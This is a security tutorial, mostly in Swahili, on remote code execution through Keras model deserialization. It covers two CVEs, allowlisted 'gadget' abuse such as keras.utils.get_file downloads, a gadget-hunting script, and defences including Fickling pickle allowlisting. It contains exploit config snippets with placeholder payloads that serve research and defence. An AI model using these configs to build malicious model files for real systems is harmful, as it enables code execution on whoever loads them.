# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Ukurasa huu unafupisha mbinu za vitendo za kutekeleza udanganyifu dhidi ya Keras model deserialization pipeline, unaeleza ndani ya muundo wa asili wa .keras na attack surface, na unatoa zana kwa mtafiti za kupata Model File Vulnerabilities (MFVs) na post-fix gadgets.

## .keras model format internals

A .keras file is a ZIP archive containing at least:
- metadata.json – taarifa za jumla (km., toleo la Keras)
- config.json – usanifu wa modelu (primary attack surface)
- model.weights.h5 – uzito katika HDF5

The config.json drives recursive deserialization: Keras imports modules, resolves classes/functions and reconstructs layers/objects from attacker-controlled dictionaries.

Example snippet for a Dense layer object:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization hufanya:
- Kuagiza module na utatuzi wa alama kutoka kwa funguo module/class_name
- from_config(...) au mwito wa constructor ukitumia kwargs zinazosimamiwa na mshambuliaji
- Kurudia ndani ya vitu vilivyowekwa (activations, initializers, constraints, etc.)

Kihistoria, hili liliweka wazi primitives tatu kwa mshambuliaji anayejenga config.json:
- Udhibiti wa modules zinazoagizwa
- Udhibiti wa ni classes/functions zipi zinazotatuliwa
- Udhibiti wa kwargs zinazopitishwa kwa constructors/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Chanzo la mzizi:
- Lambda.from_config() ilitumia python_utils.func_load(...) ambayo hufasiri base64 na kuita marshal.loads() juu ya bytes za mshambuliaji; Python unmarshalling inaweza kutekeleza code.

Exploit idea (simplified payload in config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Kupunguza hatari:
- Keras inaweka safe_mode=True kwa default. Serialized Python functions katika Lambda zimezuiliwa isipokuwa mtumiaji anaamua kuondoa kwa wazi kwa safe_mode=False.

Vidokezo:
- Legacy formats (older HDF5 saves) au codebases za zamani huenda zisitekeleze ukaguzi wa kisasa, hivyo mashambulizi ya aina ya “downgrade” bado yanaweza kutumika wakati waathirika wanapotumia loaders za zamani.

## CVE-2025-1550 – Uingizaji wa moduli yoyote kwa hiari katika Keras ≤ 3.8

Sababu kuu:
- _retrieve_class_or_fn ilitumia importlib.import_module() isiyozuiliwa na module strings zinazosimamiwa na mshambuliaji kutoka config.json.
- Athari: Uingizaji wa moduli yoyote iliyowekwa kwa hiari (au moduli iliyowekewa na mshambuliaji kwenye sys.path). Msimbo unaoendeshwa wakati wa import unaanzishwa, kisha ujenzi wa object hufanyika kwa kutumia kwargs za mshambuliaji.

Wazo la exploit:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Maboresho ya usalama (Keras ≥ 3.9):

- Orodha ya moduli iliyoruhusiwa: imports zimezuiliwa kwa moduli rasmi za ekosistimu: keras, keras_hub, keras_cv, keras_nlp
- Mode salama ya chaguo-msingi: safe_mode=True inazuia loading ya serialized-function za Lambda zisizo salama
- Uhakiki wa aina za msingi: vitu vilivyodeserialized lazima viendane na aina zinazotarajiwa

## Uso wa gadget wa post-fix ndani ya orodha iliyoruhusiwa

Hata kwa kutumia orodha ya ruhusa na mode salama, uso mpana bado upo miongoni mwa callables za Keras zilizoruhusiwa. Kwa mfano, keras.utils.get_file inaweza kupakua URL yoyote kwenda kwenye maeneo yanayochaguliwa na mtumiaji.

Gadget kupitia Lambda inayorejelea function iliyoruhusiwa (not serialized Python bytecode):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Kizuizi muhimu:
- Lambda.call() inaweka input tensor kama hoja ya kwanza ya positional wakati inapoita callable lengwa. Gadgets zilizochaguliwa lazima zivumilie positional arg ya ziada (au zikubali *args/**kwargs). Hii inaleta vikwazo kwa functions zinazoweza kutumika.

Madhara yanayowezekana ya allowlisted gadgets:
- Kupakua/kuandika kwa hiari (path planting, config poisoning)
- Network callbacks/SSRF-like effects zikitegemea environment
- Kuunganisha hadi code execution ikiwa paths zilizoorodheshwa zitaimportiwa/ziendeshwa baadaye au zitaongezwa kwenye PYTHONPATH, au ikiwa kuna eneo linaloweza kuandikwa ambalo hufanya execution-on-write

## Zana za Mtafiti

1) Ugunduzi wa gadgets kwa mfumo katika moduli zilizoruhusiwa

Taja callables zinazowezekana katika keras, keras_nlp, keras_cv, keras_hub, na zipangilie kwa kipaumbele zile zenye madhara ya upande wa file/network/process/env.
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
2) Upimaji wa deserialization ya moja kwa moja (hakuna .keras archive inayohitajika)

Weka dicts zilizotengenezwa moja kwa moja ndani ya Keras deserializers ili kujifunza params zinazokubalika na kuona madhara ya pembeni.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Uchunguzi kwa matoleo tofauti na miundo

Keras inapatikana katika codebases/eras mbalimbali zenye vizuizi na miundo tofauti:
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, slated for deletion)
- tf-keras: maintained separately
- Multi-backend Keras 3 (official): introduced native .keras

Rudia majaribio katika codebases na miundo (.keras vs legacy HDF5) ili kugundua regressions au ukosefu wa vizuizi.

## Mapendekezo ya ulinzi

- Tazama faili za modeli kama ingizo zisizoaminika. Pakia modeli tu kutoka vyanzo vinavyotegemewa.
- Weka Keras imesasishwa; tumia Keras ≥ 3.9 ili kunufaika na allowlisting na type checks.
- Usiweka safe_mode=False wakati wa kupakia modeli isipokuwa ukiwa unaamini kabisa faili.
- Fikiria kuendesha deserialization katika mazingira yaliyofungiwa (sandboxed), yenye vibali vya chini kabisa bila network egress na na upatikanaji wa filesystem uliodhibitiwa.
- Tekeleza allowlists/signatures kwa vyanzo vya modeli na ukaguzi wa uadilifu inapowezekana.

## ML pickle import allowlisting for AI/ML models (Fickling)

Many AI/ML model formats (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, older TensorFlow artifacts, etc.) embed Python pickle data. Wadukuzi mara kwa mara wanatumia kwa mabaya pickle GLOBAL imports na object constructors ili kufanikisha RCE au model swapping wakati wa load. Blacklist-based scanners mara nyingi hukosa imports hatarishi mpya au zisizoorodheshwa.

Ulinzi wa vitendo wa fail-closed ni ku-hook deserializer ya Python’s pickle na kuruhusu tu seti iliyopitiwa ya imports zisizo hatari zinazohusiana na ML wakati wa unpickling. Trail of Bits’ Fickling inatekeleza sera hii na inakuja na curated ML import allowlist iliyojengwa kutoka maelfu ya public Hugging Face pickles.

Security model for “safe” imports (intuitions distilled from research and practice): imported symbols used by a pickle must simultaneously:
- Not execute code or cause execution (no compiled/source code objects, shelling out, hooks, etc.)
- Not get/set arbitrary attributes or items
- Not import or obtain references to other Python objects from the pickle VM
- Not trigger any secondary deserializers (e.g., marshal, nested pickle), even indirectly

Enable Fickling’s protections as early as possible in process startup so that any pickle loads performed by frameworks (torch.load, joblib.load, etc.) are checked:
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Vidokezo vya uendeshaji:
- Unaweza kuzima kwa muda/kuwezesha tena hooks pale inapohitajika:
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Ikiwa model inayojulikana kuwa salama imezuiwa, panua allowlist kwa mazingira yako baada ya kupitia symbols:
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling pia inatoa kinga za runtime za jumla ikiwa unapendelea udhibiti wa kina zaidi:
- fickling.always_check_safety() to enforce checks for all pickle.load()
- with fickling.check_safety(): for scoped enforcement
- fickling.load(path) / fickling.is_likely_safe(path) for one-off checks

- Tumia fomati za modeli zisizo za pickle inapowezekana (mfano, SafeTensors). Ikiwa lazima upokee pickle, endesha loaders kwa idhini ndogo kabisa bila kuondoka kwa trafiki mtandaoni na utekeleze orodha ya kuruhusu.

Mkakati huu wa orodha ya kuruhusu kwanza unaonyesha wazi kuzuia njia za kawaida za eksploit za pickle katika ML wakati ukibakiza kiwango kikubwa cha compatibility. Katika benchmark ya ToB, Fickling ilitambua 100% ya faili bandia za uharibifu na kuruhusu takriban 99% ya faili safi kutoka kwa repos maarufu za Hugging Face.

## References

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [Picklescan](https://github.com/mmaitre314/picklescan), [ModelScan](https://github.com/protectai/modelscan), [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
